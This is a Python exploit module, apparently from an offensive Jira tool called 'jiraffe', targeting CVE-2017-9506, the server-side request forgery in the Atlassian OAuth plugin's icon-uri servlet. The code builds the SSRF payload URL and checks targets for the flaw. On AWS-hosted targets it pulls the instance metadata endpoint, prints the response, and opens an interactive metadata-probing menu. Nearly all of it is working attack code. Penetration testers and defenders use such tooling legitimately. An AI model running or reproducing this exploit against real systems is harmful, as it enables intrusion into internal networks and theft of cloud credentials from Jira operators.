#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from jiraffe.exploits.base import Exploit
from jiraffe.style import Style
from jiraffe.enums import Severity
from jiraffe.common import isaws, aws_ssrf_menu
from jiraffe.constants import (
    AWS_INSTANCE,
    DEFAULT_SSRF_TEST,
)


class CVE20179506(Exploit):
    cve = "CVE-2017-9506"
    severity = Severity.HIGH
    description = "Server-side request forgery in IconUriServlet of the Atlassian OAuth Plugin leading to internal network access and XSS"
    # IconUriServlet of the Atlassian OAuth Plugin from version 1.3.0 before version 1.9.12 and from version 2.0.0 before version 2.0.4

    def __init__(
        self,
        client,
        target,
        verbose=False,
        check_only=False,
        ssrf_target=DEFAULT_SSRF_TEST,
    ):
        super().__init__(client, target, verbose, check_only)
        self.ssrf_target = ssrf_target

    def _build_payload(self, ssrf_url: str) -> str:
        return (
            f"{self.target}/plugins/servlet/oauth/users/icon-uri"
            f"?consumerUri={ssrf_url}"
        )

    def check(self) -> bool:
        payload = self._build_payload(self.ssrf_target)
        r = self.client.get(payload)

        if self.verbose:
            print(f"[DEBUG] Status: {r.status_code}")
            print(f"[DEBUG] Headers: {r.headers}")

        if r.status_code == 200 and "googlelogo" in r.text:
            username = r.headers.get("X-AUSERNAME")
            if username:
                print(
                    Style.GREEN("[+] X-AUSERNAME: ")
                    + Style.UNDERLINE(username)
                )
            return True

        return False

    def exploit(self):
        print(Style.GREEN("[+] Target confirmed vulnerable"))

        print(Style.YELLOW("[*] Detecting hosting provider..."))
        if not isaws(self.target, self.client):
            print(Style.RED("[-] Target does not appear to be hosted on AWS"))
            return

        print(Style.GREEN("[+] Target appears to be hosted on AWS"))
        print(Style.YELLOW("[*] Testing AWS metadata SSRF"))

        metadata_payload = self._build_payload(AWS_INSTANCE)
        r = self.client.get(metadata_payload)

        if r.status_code != 200:
            print(Style.RED("[-] AWS metadata SSRF failed"))
            return

        print(Style.GREEN("[+] AWS SSRF successful"))
        print(Style.GREEN(r.text))

        aws_ssrf_menu(
            f"{self.target}/plugins/servlet/oauth/users/icon-uri?consumerUri=",
            self.client
        )
